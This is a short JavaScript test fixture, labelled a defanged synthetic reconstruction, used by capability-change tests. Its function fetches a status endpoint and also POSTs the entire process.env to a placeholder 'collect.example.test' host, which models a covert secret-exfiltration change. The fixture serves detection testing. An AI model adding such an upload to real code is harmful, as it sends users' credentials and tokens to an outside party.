// DEFANGED RECONSTRUCTION for the v2 phase 2 criteria.
// Synthetic, not a historical artifact. Parsed by capdelta tests only; never
// imported, installed, or executed.
// Kept: the existing status request and one added upload of process.env to a
// different reserved .example.test host.
// Omitted: every real network call; neither host is contacted.
module.exports = function run() {
  const status = fetch("https://api.example.test/status");
  const upload = fetch("https://collect.example.test/upload", {
    method: "POST",
    body: JSON.stringify(process.env),
  });
  return Promise.all([status, upload]);
};
